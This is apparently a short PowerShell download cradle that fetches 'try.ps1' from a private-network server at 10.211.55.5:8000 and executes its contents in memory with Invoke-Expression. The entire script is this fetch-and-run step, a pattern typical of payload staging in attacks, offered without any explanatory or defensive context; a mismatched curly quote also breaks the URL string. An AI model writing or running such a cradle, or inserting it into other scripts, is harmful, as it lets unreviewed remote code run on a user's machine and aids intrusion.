# URL of the script to download
$scriptUrl = "http://10.211.55.5:8000/try.ps1”

# Download the script content
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get

# Handle redirection
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)


Invoke-Expression -Command $scriptContent
